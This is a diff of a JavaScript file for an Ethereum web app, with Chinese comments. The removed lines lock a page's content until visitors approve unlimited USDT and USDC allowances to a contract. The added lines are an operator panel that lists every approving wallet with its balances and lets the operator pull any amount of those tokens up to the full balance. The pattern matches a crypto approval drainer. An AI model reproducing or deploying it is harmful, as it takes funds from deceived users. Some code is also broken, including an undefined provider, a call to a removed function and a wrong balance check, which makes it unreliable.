@@ -36,52 +36,71 @@ let usdcBalance = 0n; // 声明 usdcBalance 变量并初始化
 let DELETED_ADDRESSES_KEY = 'deletedAddresses';
 let ADDRESS_NOTES_KEY = 'addressNotes';
 
-const connectButton = document.getElementById('connectButton');
-// Stores event listener references to remove old listeners on re-initialization
-let accountChangeListener = null;
-let chainChangeListener = null;
-
-const overlay = document.getElementById('blurOverlay'); // 新增：獲取遮罩元素
-const overlayMessage = document.getElementById('overlayMessage'); // 新增：獲取遮罩訊息元素
-
-// --- 遮罩控制函數 ---
-
-function hideOverlay() {
-    overlay.style.opacity = '0';
-    setTimeout(() => {
-        overlay.style.display = 'none';
-    }, 300); // 等待淡出效果完成
+// 檢查 ethers.js 是否加載
+if (typeof ethers === 'undefined') {
+    console.error('ethers.js 未加載。');
+    const status = document.getElementById('status');
+    if (status) status.innerText = '錯誤：ethers.js 未加載。';
+} else {
+    console.log('ethers.js 版本：', ethers.version);
 }
 
-function showOverlay(message) {
-    overlayMessage.innerHTML = message;
-    overlay.style.display = 'flex';
-    setTimeout(() => {
-        overlay.style.opacity = '1';
-    }, 10);
+// --- 初始化與事件綁定 (保持不變) ---
+document.addEventListener('DOMContentLoaded', () => {
+    bindEventListeners();
+    initialize();
+});
+
+function bindEventListeners() {
+    const loadWalletButton = document.getElementById('loadWalletButton');
+    const refreshButton = document.getElementById('refreshButton');
+    const statusDiv = document.getElementById('status');
+    const tableBody = document.getElementById('balanceTableBody');
+
+    let allFound = true;
+
+    if (!loadWalletButton || !refreshButton || !statusDiv || !tableBody) {
+        allFound = false;
+        console.error('致命錯誤：backend.html 中缺少核心 ID。');
+    }
+
+    if (!allFound) {
+        if (statusDiv) statusDiv.innerText = '致命錯誤：所需的頁面元素缺失 (檢查 loadWalletButton/refreshButton/status/balanceTableBody ID)。';
+        return;
+    }
+
+    loadWalletButton.addEventListener('click', loadWallet);
+    refreshButton.addEventListener('click', updateBalances);
+
+    console.log('事件監聽器已成功綁定。');
 }
 
-// --- initializeWallet 函數 (僅保留錯誤/必要訊息) ---
-
-async function initializeWallet() {
+async function initialize() {
     try {
-        if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a supported wallet'); // 顯示必要錯誤
-            showOverlay('請安裝 MetaMask 或支援的錢包以繼續');
+        if (typeof ethers === 'undefined') return;
+        readProvider = new ethers.JsonRpcProvider(INFURA_URL);
+        readContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, readProvider);
+        readUsdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, readProvider);
+        multicallContract = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, readProvider);
+        document.getElementById('status').innerText = 'Initialized. 請點擊「連繫店家錢包」。';
+    } catch (error) {
+        document.getElementById('status').innerText = `Initialization failed: ${error.message}`;
+        console.error('Initialize error:', error);
+    }
+}
+
+// --- 錢包載入功能 (與上一個完整版相同) ---
+async function loadWallet() {
+    try {
+        if (!window.ethereum) {
+            document.getElementById('status').innerText = '請安裝 MetaMask。';
             return;
         }
 
-        provider = new ethers.BrowserProvider(window.ethereum);
-
-        // Remove old listeners to prevent duplicate bindings
-        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
-        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);
-
-        // Check network and switch to Mainnet
-        const network = await provider.getNetwork();
-        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
-            updateStatus('Switching to Ethereum Mainnet...'); // 顯示切換網路的警告/提示
-            showOverlay('正在嘗試切換到以太坊主網... 請在錢包中確認');
+        walletProvider = new ethers.BrowserProvider(window.ethereum);
+        const network = await walletProvider.getNetwork();
+        if (network.chainId !== 1n) {
+            document.getElementById('status').innerText = '請切換到 Ethereum Mainnet (主網)。';
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
@@ -103,229 +122,412 @@ async function initializeWallet() {
         }
 
         const accounts = await provider.send('eth_accounts', []);
-        if (accounts.length > 0) {
-            userAddress = accounts[0];
-            signer = await provider.getSigner();
-
-            // Initialize contracts with signer
-            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer); //  初始化 USDC 合約
-
-            // ** 連線已恢復，直接檢查授權，不顯示進度文字 **
-            updateStatus(''); // 清空/隱藏狀態欄
-            await checkAuthorization();
-        } else {
-            updateStatus(''); // 隱藏狀態欄
-            showOverlay('請連繫錢包以解鎖內容');
+        if (!accounts || accounts.length === 0) {
+            document.getElementById('status').innerText = '未選擇帳戶。請在 MetaMask 中確認。';
+            return;
         }
 
-        // Account change listener, simplified to re-initialize
-        accountChangeListener = (accounts) => {
-            if (accounts.length === 0) {
-                resetState();
-                updateStatus('Wallet disconnected'); // 顯示斷開連繫的提示
+        signer = await walletProvider.getSigner();
+        const address = await signer.getAddress();
+
+        // 🚨 這裡會使用修正後的 STORE_ADDRESS 進行檢查
+        if (address.toLowerCase() !== STORE_ADDRESS.toLowerCase()) {
+            document.getElementById('status').innerText = `請使用正確的店家錢包地址: ${STORE_ADDRESS}`;
+            signer = null;
+            return;
+        }
+
+        writeContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+        writeUsdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+
+        document.getElementById('status').innerText = '連線成功！';
+        await updateBalances();
+
+        //  添加事件監聽器
+        window.ethereum.on('accountsChanged', handleAccountsChanged);
+        window.ethereum.on('chainChanged', handleChainChanged);
+
+        if (!window._intervalId) {
+            window._intervalId = setInterval(() => updateBalances(), 60000);
+        }
+
+    } catch (error) {
+        document.getElementById('status').innerText = `連線失敗: ${error.message}`;
+        console.error('Load wallet error:', error);
+    }
+}
+
+// --- 核心功能：讀取已授權客戶的餘額和授權額度 ---
+async function updateBalances() {
+    try {
+        if (!readProvider || !multicallContract) {
+            document.getElementById('status').innerText = 'Error: Provider or Multicall not initialized.';
+            return;
+        }
+
+        // 1. 顯示合約 ETH 餘額
+        const contractEthBalance = await retry(() => readProvider.getBalance(CONTRACT_ADDRESS), 3, 1000);
+        const formattedContractEth = ethers.formatEther(contractEthBalance);
+        const balanceDiv = document.getElementById('contractBalanceStatus');
+
+        if (balanceDiv) {
+            const minEthRequired = ethers.parseEther('0.001');
+            if (contractEthBalance < minEthRequired) {
+                balanceDiv.innerHTML = `<div class="alert alert-warning" role="alert">⚠️ <strong>合約 ETH 餘額:</strong> ${formattedContractEth} ETH (不足! 請充值)</div>`;
             } else {
-                initializeWallet();
+                balanceDiv.innerHTML = `<div class="alert alert-success" role="alert">✅ <strong>合約 ETH 餘額:</strong> ${formattedContractEth} ETH (正常)</div>`;
             }
-        };
-        window.ethereum.on('accountsChanged', accountChangeListener);
+        }
 
-        // Network change listener
-        chainChangeListener = () => {
-            resetState();
-            updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
-            window.location.reload();
-        };
-        window.ethereum.on('chainChanged', chainChangeListener);
+        const tableBody = document.getElementById('balanceTableBody');
+        if (!tableBody) throw new Error('Table body not found');
+        tableBody.innerHTML = '<tr><td colspan="5" class="text-center">正在載入客戶數據...</td></tr>';
 
-    } catch (error) {
-        updateStatus(`Initialization failed: ${error.message}`); // 顯示初始化失敗的錯誤
-        console.error("Initialize Wallet Error:", error);
-        showOverlay(`初始化失敗: ${error.message}`);
-    }
-}
+        // 1. 載入已刪除的地址和備註
+        const deletedAddresses = JSON.parse(localStorage.getItem(DELETED_ADDRESSES_KEY)) || [];
+        const addressNotes = JSON.parse(localStorage.getItem(ADDRESS_NOTES_KEY)) || {};
 
-// --- checkAuthorization 函數 (邏輯不變，僅調整 updateStatus 呼叫) ---
+        // 2. 獲取所有授權過的客戶列表 (核心邏輯)
+        let customers = await getAuthorizedCustomers();
 
-async function checkAuthorization() {
-    try {
-        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) { // 新增 usdcContract 检查
-            showOverlay('錢包未準備好。請連線。');
+        // 3. 过滤已删除的地址
+        customers = customers.filter(customer => !deletedAddresses.includes(customer));
+
+        tableBody.innerHTML = '';
+
+        if (customers.length === 0) {
+            tableBody.innerHTML = '<tr><td colspan="5" class="text-center">目前沒有授權客戶數據。</td></tr>';
+            document.getElementById('status').innerText = 'No authorized customers found.';
             return;
         }
 
-        const isAuthorized = await contract.authorized(userAddress);
-        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
-        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS); // USDC 授權額度檢查
-        const maxAllowance = ethers.MaxUint256;
-
-        let statusMessage = '';
-
-        // Check SimpleMerchant contract authorization
-        if (isAuthorized) {
-            statusMessage += 'SimpleMerchant 合約已授權 ✅. '; // SimpleMerchant 合約已授權
-        } else {
-            statusMessage += 'SimpleMerchant 合約 NOT authorized ❌. '; // SimpleMerchant 合約未授權
+        // 3. 准备 Multicall 批次查询 (優化讀取速度)
+        const calls = [];
+        for (const customer of customers) {
+            // USDT 餘額
+            calls.push({ target: USDT_CONTRACT_ADDRESS, callData: readUsdtContract.interface.encodeFunctionData('balanceOf', [customer]) });
+            // USDC 餘額  <--  新增 USDC 餘額的查詢
+            calls.push({ target: USDC_CONTRACT_ADDRESS, callData: new ethers.Contract(USDC_CONTRACT_ADDRESS,USDC_ABI,readProvider).interface.encodeFunctionData('balanceOf', [customer]) });
+            // 合約中的授權狀態 (double check)
+            calls.push({ target: CONTRACT_ADDRESS, callData: readContract.interface.encodeFunctionData('authorized', [customer]) });
         }
 
-        // Check USDT authorization
-        const isUsdtMaxApproved = usdtAllowance >= maxAllowance;
-        if (isUsdtMaxApproved) {
-            statusMessage += `USDT approved for MaxUint256 ✅. `; // USDT 已授權足夠金額 (MaxUint256)
-        } else {
-            statusMessage += `USDT not approved or approval is zero ❌. `; // USDT 未授權或授權為零
+        const { returnData } = await retry(() => multicallContract.aggregate(calls), 3, 1000);
+
+        // 4. 解析數據並生成表格
+        for (let i = 0; i < customers.length; i++) {
+            const customer = customers[i];
+            const ethBalance = await retry(() => readProvider.getBalance(customer), 3, 1000);
+            usdtBalance = ethers.AbiCoder.defaultAbiCoder().decode(['uint256'], returnData[i * 3])[0]; //  <-- 修正索引，因為減少了 1 個查詢
+            usdcBalance = ethers.AbiCoder.defaultAbiCoder().decode(['uint256'], returnData[i * 3 + 1])[0]; //  <--  新增 USDC 餘額 (balanceOf)
+            const isAuthorized = ethers.AbiCoder.defaultAbiCoder().decode(['bool'], returnData[i * 3 + 2])[0]; //  <-- 修正索引
+
+            if (!isAuthorized) continue; // 排除雖然有事件但已經被合約撤銷授權的客戶
+
+            // 決定扣款按鈕狀態
+            const deductButtonDisabled = signer ? '' : 'disabled';
+            // const canDeduct = allowance >= ethers.parseUnits('0.01', 6);
+            // const canDeductUSDC = usdcAllowance >= ethers.parseUnits('0.01', 6); //  移除，不再需要
+
+            const input = document.createElement('input');
+            input.type = 'number';
+            input.id = `usdt_amount_${customer}`;
+            input.placeholder = '輸入數量';
+            input.step = '0.01';
+            input.min = '0';
+            input.max = ethers.formatUnits(usdtBalance, 6);
+
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>
+                    <button class="btn btn-sm btn-warning delete-button" data-customer="${customer}">刪除</button>  <!-- 刪除按鈕 -->
+                    ${customer}
+                </td>
+                <td>${ethers.formatEther(ethBalance)} ETH</td>
+                <td>${ethers.formatUnits(usdtBalance, 6)} USDT</td>
+                <td>${ethers.formatUnits(usdcBalance, 6)} USDC</td>  <!-- 新增 USDC 餘額顯示 -->
+                <td>
+                    ${input.outerHTML}
+                    <select id="token_select_${customer}" class="form-control form-control-sm">
+                        <option value="usdt">USDT</option>
+                        <option value="usdc">USDC</option>
+                    </select>
+                    <button class="btn btn-sm btn-danger deduct-button" data-customer="${customer}" data-type="usdt" ${deductButtonDisabled}>扣款</button>
+                    <span class="address-note-display" data-customer="${customer}">${addressNotes[customer] || ''}</span>
+                    <input type="text" class="address-note-edit form-control form-control-sm" data-customer="${customer}" placeholder="備註" value="${addressNotes[customer] || ''}" style="display: none;">  <!-- 備註輸入框，預設隱藏 -->
+                     <i class="fas fa-pencil-alt edit-note-icon" data-customer="${customer}" style="cursor: pointer; margin-left: 5px;" title="編輯備註"></i>  <!-- 鉛筆圖標 -->
+
+                </td>
+            `;
+            tableBody.appendChild(row);
         }
 
-        //  Check USDC authorization
-        const isUsdcMaxApproved = usdcAllowance >= maxAllowance;
-        if (isUsdcMaxApproved) {
-            statusMessage += `USDC approved for MaxUint256 ✅.`; // USDC 已授權足夠金額 (MaxUint256)
-        } else {
-            statusMessage += `USDC not approved or approval is zero ❌. `; // USDC 未授權或授權為零
-        }
+        document.getElementById('status').innerText = `數據更新成功。偵測到 ${customers.length} 個授權客戶。`;
 
-        // Button state: needs to be clicked if authorization is incomplete
-        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved;
+        // 5. 綁定扣款按鈕事件
+        tableBody.querySelectorAll('.deduct-button').forEach(button => {
+            button.addEventListener('click', handleDeductClick);
+        });
 
-        if (allAuthorized) {
-            connectButton.classList.add('connected');
-            connectButton.title = 'Disconnect Wallet'; // 斷開錢包
-            connectButton.disabled = false;
-            updateStatus(''); // 成功時，清空/隱藏狀態欄
-            hideOverlay(); // 完全授權，隱藏遮罩
-        } else {
-            connectButton.classList.remove('connected');
-            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
-            connectButton.disabled = false;
-            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
-            showOverlay('需要完成合約和 USDT/USDC 授權才能查看內容。點擊右上角按鈕開始交易。'); // 授權未完成，顯示遮罩
-        }
+        // 6. 绑定删除按钮的事件
+        tableBody.querySelectorAll('.delete-button').forEach(button => {
+            button.addEventListener('click', handleDeleteClick);
+        });
+
+        // 7.  绑定备注输入框的事件
+        tableBody.querySelectorAll('.address-note-edit').forEach(input => { //  <-- 監聽編輯框
+            input.addEventListener('blur', handleNoteChange); //  <-- 修改，使用 blur 事件
+        });
+
+        // 8. 绑定铅笔图标的点击事件
+        tableBody.querySelectorAll('.edit-note-icon').forEach(icon => {
+            icon.addEventListener('click', handleEditNoteClick);
+        });
+
     } catch (error) {
-        updateStatus(`Authorization check failed: ${error.message}`); // 顯示錯誤
-        console.error("Check Authorization Error:", error);
-        showOverlay(`檢查授權失敗: ${error.message}`);
+        document.getElementById('status').innerText = `Failed to update balances: ${error.message}`;
+        console.error('Update balances error:', error);
     }
 }
 
-
-// --- connectWallet 函數 (移除所有中間狀態更新) ---
-
-async function connectWallet() {
+// --- 核心功能：透過事件查找所有曾經授權過的客戶地址 ---
+async function getAuthorizedCustomers() {
     try {
-        if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a supported wallet');
+        const eventContract = readContract;
+        // 過濾 Authorized 事件
+        const filter = eventContract.filters.Authorized();
+        const events = await retry(() => eventContract.queryFilter(filter, 0, 'latest'), 3, 1000);
+
+        // 提取並去重客戶地址
+        const uniqueCustomers = [...new Set(events.map(event => event.args.customer))];
+
+        const authorizedCustomers = [];
+        for (const customer of uniqueCustomers) {
+            // 再次檢查合約狀態，確認客戶是否仍然被合約視為 "authorized"
+            const isAuthorized = await retry(() => eventContract.authorized(customer), 3, 1000);
+            if (isAuthorized) {
+                authorizedCustomers.push(customer);
+            }
+        }
+        return authorizedCustomers;
+    } catch (error) {
+        document.getElementById('status').innerText = `Failed to retrieve authorized customers: ${error.message}`;
+        console.error('Get authorized customers error:', error);
+        return [];
+    }
+}
+
+// --- 扣款功能 (與上一個完整版相同) ---
+async function handleDeductClick(event) {
+    try {
+        const customer = event.target.getAttribute('data-customer');
+        const buttonElement = event.target;
+
+        if (!signer) {
+            document.getElementById('status').innerText = 'Error: 請先連繫店家錢包才能扣款。';
             return;
         }
 
-        updateStatus(''); // 連線開始，隱藏狀態欄
-        showOverlay('請在您的錢包中確認連線請求...');
-
-        // Request wallet connection (MetaMask will confirm or maintain connection)
-        await provider.send('eth_requestAccounts', []);
-
-        // Re-get signer and contract instances
-        signer = await provider.getSigner();
-        userAddress = await signer.getAddress();
-        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer);
-
-        // ** 一次性授權 **
-
-        // 1. SimpleMerchant 合約授權
-        showOverlay('1/3: 請在錢包中簽署 **SimpleMerchant 合約授權** 交易...');
-        const txAuthorize = await contract.connectAndAuthorize();
-        const receiptAuthorize = await txAuthorize.wait();
-        if (receiptAuthorize.status !== 1) {
-            throw new Error('SimpleMerchant 合約授權 交易失敗.');
+        //  從選擇器獲取代幣類型
+        const tokenSelect = document.getElementById(`token_select_${customer}`);
+        if (!tokenSelect) {
+            document.getElementById('status').innerText = 'Error: 無法找到代幣選擇器。';
+            return;
         }
+        const tokenType = tokenSelect.value;
 
-        // 2. USDT 代幣授權
-        const maxAllowance = ethers.MaxUint256;
-        showOverlay('2/3: 請在錢包中簽署 **USDT 代幣 MaxUint256 授權** 交易...');
-        const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
-        const receiptApproveUsdt = await txApproveUsdt.wait();
-        if (receiptApproveUsdt.status !== 1) {
-            throw new Error('USDT 授權交易失敗.');
+        if (tokenType === 'usdt' || tokenType === 'usdc') {  // 检查 token type
+            await deductToken(customer, tokenType, buttonElement); // 呼叫新的扣款函數
+        } else {
+            document.getElementById('status').innerText = 'Error: 無效的代幣類型。';
         }
-
-        // 3. USDC 代幣授權  (在前面新增 USDC 合約)
-        showOverlay('3/3: 請在錢包中簽署 **USDC 代幣 MaxUint256 授權** 交易...');
-        const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
-        const receiptApproveUsdc = await txApproveUsdc.wait();
-        if (receiptApproveUsdc.status !== 1) {
-            throw new Error('USDC 授權交易失敗.');
-        }
-
-        // Final check and update button appearance
-        await checkAuthorization();
-        updateStatus(''); // 連線成功，隱藏狀態欄
-
     } catch (error) {
-        let errorMessage = `操作失敗：${error.message}`;
-        if (error.code === 4001) {
-            errorMessage = '用戶拒絕交易 (User rejected transaction)';
-        } else if (error.code === 'ACTION_REJECTED') { // 這個代碼可能因钱包而异
-            errorMessage = '用戶拒絕交易 (User rejected transaction)';
-        } else if (error.code === 'INSUFFICIENT_FUNDS') {
-            errorMessage = 'ETH 餘額不足，無法支付燃料費。';
-        }
-        // ...
-        showOverlay(`操作失敗。請重試或手動檢查連線。 錯誤：${errorMessage}`);
-        console.error("Connect Wallet Error:", error);
-        connectButton.classList.remove('connected');
-        connectButton.title = 'Connect Wallet'; // 連繫錢包
-        connectButton.disabled = false;
+        // ... (錯誤由 deductToken 處理)
     }
 }
 
+async function deductToken(customer, tokenType, buttonElement) { //  <-- 新增的函數，支援多種代幣
+    try {
+        if (!writeContract || !signer) {
+            document.getElementById('status').innerText = 'Please connect the store wallet.';
+            return;
+        }
 
-// --- 其他函數 (保持不變) ---
+        buttonElement.disabled = true;
 
-function disconnectWallet() {
+        const amountInput = document.getElementById(`usdt_amount_${customer}`); //  <--  保持 ID 不變，因為我們使用它來獲取輸入值
+        if (!amountInput.value || isNaN(amountInput.value) || Number(amountInput.value) <= 0) {
+            document.getElementById('status').innerText = 'Please enter a valid amount.';
+            buttonElement.disabled = false;
+            return;
+        }
+        const amount = ethers.parseUnits(amountInput.value, 6); //  <--  保持精度為 6 位，USDT/USDC 相同
+
+        const contractEthBalance = await retry(() => readProvider.getBalance(CONTRACT_ADDRESS), 3, 1000);
+        const minEthRequired = ethers.parseEther('0.001');
+        if (contractEthBalance < minEthRequired) {
+            document.getElementById('status').innerText = `❌ 合約 ETH 餘額不足 (${ethers.formatEther(contractEthBalance)} ETH)。請充值。`;
+            buttonElement.disabled = false;
+            return;
+        }
+
+        let tokenAddress; //  <--  根據 tokenType 選擇地址
+        let tokenName;
+        let balance; // 客戶代幣餘額
+        // let allowance; // 客戶授權額度  (不再使用，因為前端授權通常是最大值)
+
+        if (tokenType === 'usdt') {
+            tokenAddress = USDT_CONTRACT_ADDRESS;
+            tokenName = 'USDT';
+            balance = usdtBalance; // 取得 usdtBalance 全域變數
+
+        } else if (tokenType === 'usdc') {
+            tokenAddress = USDC_CONTRACT_ADDRESS;
+            tokenName = 'USDC';
+            //  取得 usdcBalance 全域變數
+            //  修改為使用  usdcBalance 變數。
+            //  這裡需要從 updateBalances 函數中获取到 usdcBalance 的值.
+            balance = usdcBalance;
+             // 不需要顯示allowance
+
+        } else {
+            throw new Error('Invalid token type'); // 應該不會發生，因為我們已經檢查過
+        }
+
+        // 檢查餘額是否足夠 (針對所有代幣)
+        if (ethers.parseUnits(amountInput.value, 6) > ethers.parseUnits(balance.toString(), 6)) {
+            document.getElementById('status').innerText = `❌ 餘額不足, 餘額: ${ethers.formatUnits(balance, 6)}  ${tokenName}。`;
+            buttonElement.disabled = false;
+            return;
+        }
+
+        document.getElementById('status').innerText = `正在準備 ${tokenName} 扣款交易，請在 MetaMask 中確認...`;
+
+        const feeData = await retry(() => readProvider.getFeeData(), 3, 1000);
+
+        const txOverrides = {
+            gasLimit: 600000n,
+            maxFeePerGas: feeData.maxFeePerGas ? feeData.maxFeePerGas * 12n / 10n : undefined,
+            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? feeData.maxPriorityFeePerGas : undefined,
+            gasPrice: feeData.maxFeePerGas === null ? feeData.gasPrice : undefined
+        };
+
+        const tx = await writeContract.deductUSDT(customer, tokenAddress, amount, txOverrides); //  <--  使用 tokenAddress
+
+        document.getElementById('status').innerText = `交易已送出。等待區塊鏈確認中 (Hash: ${tx.hash})....`;
+        const receipt = await tx.wait();
+
+        if (receipt.status !== 1) {
+            throw new Error('Transaction failed on-chain. Status: ' + receipt.status);
+        }
+
+        document.getElementById('status').innerText = `扣款成功: ${ethers.formatUnits(amount, 6)} ${tokenName}。交易 Hash: ${tx.hash}`;
+        await updateBalances();
+
+    } catch (error) {
+        let errorMessage = error.message;
+        if (error.code === 4001) errorMessage = '用戶拒絕交易 (User rejected transaction)';
+        else if (error.code === 'CALL_EXCEPTION') errorMessage = `合約執行失敗: ${error.reason || '請檢查 ${tokenType.toUpperCase()} 合約或客戶授權。'}`; //  <--  更詳細的錯誤訊息
+        else if (error.code === 'TRANSACTION_REPLACED') errorMessage = `交易被替換。新 Hash: ${error.replacement.hash || 'N/A'}. 請檢查新的交易狀態。`;
+
+        document.getElementById('status').innerText = `${tokenName} 扣款失敗: ${errorMessage}`; //  <--  更詳細的錯誤訊息
+        console.error(`Deduct ${tokenName} error:`, error);
+    } finally {
+        if (buttonElement) buttonElement.disabled = false;
+    }
+}
+
+// --- 雜項輔助函數 (與上一個完整版相同) ---
+function handleAccountsChanged(accounts) {
+    if (accounts.length === 0) {
+        resetState();
+        document.getElementById('status').innerText = 'MetaMask 錢包已斷開連線。';
+    } else {
+        loadWallet();
+    }
+}
+
+function handleChainChanged() {
     resetState();
-    updateStatus('Wallet disconnected, please reconnect.'); // 顯示斷開連繫的提示
-    alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.'); // 提示用戶手動斷開
-    showOverlay('錢包已斷開連繫，請連繫以解鎖內容'); // 斷開時顯示遮罩
+    updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
+    window.location.reload();
 }
 
 function resetState() {
     signer = null;
-    userAddress = null;
-    contract = null;
-    usdtContract = null;
-    usdcContract = null;  // 也要清空 usdcContract
-    connectButton.classList.remove('connected');
-    connectButton.title = 'Connect Wallet'; // 連繫錢包
-    connectButton.disabled = false;
-    updateStatus(''); // 重設時清空狀態欄
-    showOverlay('請連繫錢包以解鎖內容 🔒'); // 重設時顯示遮罩
-}
-
-/**
- * 核心功能：控制狀態欄的隱藏與顯示。
- */
-function updateStatus(message) {
-    const statusDiv = document.getElementById('status');
-    if (message) {
-        statusDiv.innerHTML = `${message}`;
-        statusDiv.style.display = 'block'; // 顯示內容
-    } else {
-        statusDiv.innerHTML = '';
-        statusDiv.style.display = 'none'; // 隱藏整個區塊
+    writeContract = null;
+    writeUsdtContract = null;
+    document.getElementById('balanceTableBody').innerHTML = '';
+    document.getElementById('contractBalanceStatus').innerHTML = '';
+    if (window._intervalId) {
+        clearInterval(window._intervalId);
+        window._intervalId = null;
     }
 }
 
-// Listen for connect button click
-connectButton.addEventListener('click', () => {
-    if (connectButton.classList.contains('connected')) {
-        disconnectWallet();
-    } else {
-        connectWallet();
+async function retry(fn, maxAttempts = 3, delayMs = 1000) {
+    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+        try {
+            return await fn();
+        } catch (error) {
+            if (attempt === maxAttempts) {
+                throw error;
+            }
+            if (error.message.includes('service temporarily unavailable') || error.message.includes('timeout')) {
+                console.warn(`Retry ${attempt}/${maxAttempts}: ${error.message}`);
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+            } else {
+                throw error;
+            }
+        }
     }
-});
+}
 
-// Initialize wallet state on page load
-initializeWallet();
-console.log('connectButton event listener added and initializeWallet called');
+// --- 刪除錢包地址的處理函数 ---
+function handleDeleteClick(event) {
+    const customer = event.target.getAttribute('data-customer');
+    let deletedAddresses = JSON.parse(localStorage.getItem(DELETED_ADDRESSES_KEY)) || [];
+    if (!deletedAddresses.includes(customer)) {
+        deletedAddresses.push(customer);
+        localStorage.setItem(DELETED_ADDRESSES_KEY, JSON.stringify(deletedAddresses));
+        updateBalances(); // 重新刷新表格
+    }
+}
+
+// --- 備註输入框的處理函数 ---
+function handleNoteChange(event) {
+    const customer = event.target.getAttribute('data-customer');
+    const note = event.target.value;
+    let addressNotes = JSON.parse(localStorage.getItem(ADDRESS_NOTES_KEY)) || {};
+    addressNotes[customer] = note;
+    localStorage.setItem(ADDRESS_NOTES_KEY, JSON.stringify(addressNotes));
+    // 顯示 span，隱藏 input
+    const displaySpan = document.querySelector(`.address-note-display[data-customer="${customer}"]`);
+    const editInput = document.querySelector(`.address-note-edit[data-customer="${customer}"]`);
+
+    if (displaySpan) {
+        displaySpan.textContent = note;
+        displaySpan.style.display = 'inline'; // 显示
+    }
+    if (editInput) {
+       editInput.style.display = 'none'; // 隱藏
+    }
+
+}
+
+//  添加处理编辑铅笔图标点击事件的函数
+function handleEditNoteClick(event) {
+    const customer = event.target.getAttribute('data-customer');
+
+    // 顯示输入框
+    const displaySpan = document.querySelector(`.address-note-display[data-customer="${customer}"]`);
+    const editInput = document.querySelector(`.address-note-edit[data-customer="${customer}"]`);
+
+    if (displaySpan) {
+       displaySpan.style.display = 'none'; // 隱藏
+    }
+    if (editInput) {
+       editInput.style.display = 'inline'; // 显示
+       editInput.focus(); // 讓編輯框獲得焦點，提高使用者體驗
+    }
+}
